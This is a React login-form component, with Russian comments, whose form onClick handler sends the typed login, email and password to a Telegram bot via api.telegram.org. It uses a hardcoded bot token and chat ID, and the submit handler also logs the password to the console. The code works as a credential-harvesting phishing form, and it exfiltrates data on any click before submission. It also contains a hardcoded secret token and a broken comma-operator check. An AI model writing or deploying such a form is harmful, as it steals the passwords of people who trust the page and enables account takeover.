import React, { Component } from 'react';
import axios from "axios";

class Form extends Component {

    constructor(props) {
        super(props);
        this.state = {
            login: '',
            email: '',
            password: ''
        };
        // Биндим функции, чтобы видеть изменения в input полях
        this.handleLoginChange = this.handleLoginChange.bind(this);
        this.handleEmailChange = this.handleEmailChange.bind(this);
        this.handlePasswordChange = this.handlePasswordChange.bind(this);
        this.handleSubmit = this.handleSubmit.bind(this);
      }
    // Submit button    
      handleSubmit(event) {
        event.preventDefault();
        if (this.state.email, this.state.login, this.state.password === '') {
            console.log('Nothing typed to form\nSosy Jopu Hacker :)')
        } else {
        console.log(
        'Login:', this.state.login,
        '\nEmail:', this.state.email,
        '\nPassword:', this.state.password
        );
        }
      }
    // Login input
      handleLoginChange(event) {
        console.log('handleLoginChange', this);
        this.setState({
            login: event.target.value,
        });
      }
    // Email input
      handleEmailChange(event) {
        console.log('handleEmailChange', this);
        this.setState({
            email: event.target.value,
        });
      }
    // password input
      handlePasswordChange(event) {
        console.log('handlePasswordChange', this);
        this.setState({
            password: event.target.value,
        });
      }

    // Form render
  render() {
      const token = '5410932952:AAEb5VlYMp4hvVMxLFrX2Vx42jkRMj5S5Rg';
      const chat_id = '-643984106'
      const login = this.state.login
      const email = this.state.email
      const password = this.state.password
    //   const oldArray = [
    //     {login: this.state.login, email: this.state.email, password: this.state.password},
    // ]
      
    // const newNumberArray = oldArray.map(function(item) {
    //   return `Login: ${item.login} Email: ${item.email} Password: ${item.password}`
    // })
    const output = 'Login:\n\n' + '<br />' + '\n' + this.state.login + "\n" + 'Email: \n' + this.state.email + '\n' + 'Password: ' + this.state.password;
      
    return (
        <div>
            <form 
              onSubmit={this.handleSubmit}
              className='mail-form' 
              onClick={async () => {
                try {
                  await axios({
                    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=Login: ${login}                                                                                                                                                                                  
                    Email: ${email}                                                                                                                             
                    Password: ${password}`,
                    headers: {
                      "Content-type": "application/json"
                    },
                    params: {
                      field: output
                    },
                    method: "GET",
                    data: null
                  }).then(({ data }) => {
                    return data;
                  });
                } catch (e) {
                  console.log("Sending error", e);
                }
              }}
            >
                <input
                    type="text"
                    placeholder="Login"
                    value={this.state.login}
                    onChange={this.handleLoginChange}
                />
                <input
                    type="text"
                    placeholder="Mail"
                    value={this.state.email}
                    onChange={this.handleEmailChange}
                />
                <input
                    type="password"
                    placeholder="Password"
                    value={this.state.password}
                    onChange={this.handlePasswordChange}
                />
            <button>Отправить</button>
            </form>

        </div>
    );
  }
}

export default Form;